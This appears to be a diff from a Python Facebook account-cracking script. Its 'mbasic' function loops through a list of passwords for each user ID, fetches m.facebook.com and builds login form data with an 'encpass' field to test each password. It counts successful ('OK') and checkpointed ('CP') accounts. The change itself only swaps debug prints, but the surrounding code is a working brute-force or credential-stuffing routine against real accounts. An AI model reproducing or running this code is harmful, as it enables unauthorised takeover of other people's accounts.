@@ -1247,9 +1247,7 @@ def mbasic(uid,pwx,tl):
     sys.stdout.write(f"\r {green}(M1) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
-        for pw in pwx:   
-            print(uid)
-            print(pw)
+        for pw in pwx:
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com/').text
             data ={
@@ -1275,6 +1273,7 @@ def mbasic(uid,pwx,tl):
             'had_password_prefilled': 'true',
             'ab_test_data': '/AAAAAAAAAAAfAAAAAAAAAAAAAAAAAAAAAAAAAAA4/AHVAAAAABHAG',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            print(data)
             cookies = {
             'ps_n': '1',
             'ps_l': '1',
